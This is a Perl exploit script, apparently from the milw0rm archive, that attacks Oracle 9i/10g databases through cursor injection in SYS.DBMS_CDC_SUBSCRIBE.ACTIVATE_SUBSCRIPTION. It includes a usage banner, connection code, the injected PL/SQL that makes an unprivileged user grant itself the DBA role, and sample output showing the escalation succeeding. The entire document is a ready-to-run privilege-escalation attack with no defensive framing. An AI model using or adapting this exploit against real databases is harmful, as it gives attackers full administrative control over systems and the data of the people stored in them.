#!/usr/bin/perl
#
# Remote Oracle DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION exploit (9i/10g)
#  - Version 2 - New "evil cursor injection" tip!
#  - No "create procedure" privileg needed!
#  - See: http://www.databasesecurity.com/ (Cursor Injection)
#
# Grant or revoke dba permission to unprivileged user
# 
# Tested on "Oracle Database 10g Enterprise Edition Release 10.1.0.3.0"
# 
#   REF:    http://www.securityfocus.com/archive/1/396133
#
#   AUTHOR: Andrea "bunker" Purificato
#           http://rawlab.mindcreations.com
#
#   DATE:   Copyright 2007 - Mon Feb 26 12:13:19 CET 2007
#
# Oracle InstantClient (basic + sdk) required for DBD::Oracle
#
#
# bunker@fin:~$ perl dbms_cdc_subscribeV2.pl -h localhost -s test -u bunker -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from BUNKER...
#  DBD::Oracle::db do failed: ORA-01031: insufficient privileges (DBD ERROR: OCIStmtExecute) [for Statement "REVOKE DBA FROM BUNKER"] at dbms_cdc_subscribeV2.pl line 92.
#  [-] Done!
# 
# bunker@fin:~$ perl dbms_cdc_subscribeV2.pl -h localhost -s test -u bunker -p **** -g
#  [-] Wait...
#  [-] Creating evil cursor...
#  Cursor: 2
#  [-] Go ...(don't worry about errors)!
#  DBD::Oracle::st execute failed: ORA-31425: subscription does not exist
#  ORA-06512: at "SYS.DBMS_CDC_SUBSCRIBE", line 37
#  ORA-06512: at line 3 (DBD ERROR: OCIStmtExecute) [for Statement "
#  BEGIN
#    SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION('''||dbms_sql.execute(2)||''');
#  END;
#  "] at dbms_cdc_subscribeV2.pl line 122.
#  [-] YOU GOT THE POWAH!!
# 
# bunker@fin:~$ perl dbms_cdc_subscribeV2.pl -h localhost -s test -u bunker -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from BUNKER...
#  [-] Done!
#  

use warnings;
use strict;
use DBI;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print <<"USAGE";
    
Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r [-P <port>]

Options:
     -h     <host>     target server address
     -s     <sid>      target sid name
     -u     <user>     user
     -p     <passwd>   password 

     -g|-r             (g)rant dba to user | (r)evoke dba from user
    [-P     <port>     Oracle port]

USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:grP:';
getopts($opt_string, \%opt) or &usage;
&usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} );
&usage if ( !$opt{g} and !$opt{r} );
my $user = uc $opt{u};

my $dbh = undef;
if ($opt{P}) {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}", $opt{u}, $opt{p}) or die;
} else {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s}", $opt{u}, $opt{p}) or die;
}

my $sqlcmd = "GRANT DBA TO $user";
print "[-] Wait...\n";
$dbh->func( 1000000, 'dbms_output_enable' );


if ($opt{r}) {
    print "[-] Revoking DBA from $user...\n";
    $sqlcmd = "REVOKE DBA FROM $user";
    $dbh->do( $sqlcmd );
    print "[-] Done!\n";
    $dbh->disconnect;
    exit;
}

print "[-] Creating evil cursor...\n";
my $sth = $dbh->prepare(qq{
DECLARE
MYC NUMBER;
BEGIN
  MYC := DBMS_SQL.OPEN_CURSOR;
  DBMS_SQL.PARSE(MYC,'declare pragma autonomous_transaction; begin execute immediate ''$sqlcmd'';commit;end;',0);
  DBMS_OUTPUT.PUT_LINE('Cursor: '||MYC);
END;
} );
$sth->execute;
my $cursor = undef;
while (my $line = $dbh->func( 'dbms_output_get' )) { 
    print "$line\n";
    if ($line =~ /^Cursor: (\d)/) {$cursor = $1;}
}
$sth->finish;

print "[-] Go ...(don't worry about errors)!\n";
$sth = $dbh->prepare(qq{
BEGIN
  SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION('''||dbms_sql.execute($cursor)||''');
END;
});
$sth->execute;
$sth->finish;
print "[-] YOU GOT THE POWAH!!\n";
$dbh->disconnect;
exit;

# milw0rm.com [2007-02-26]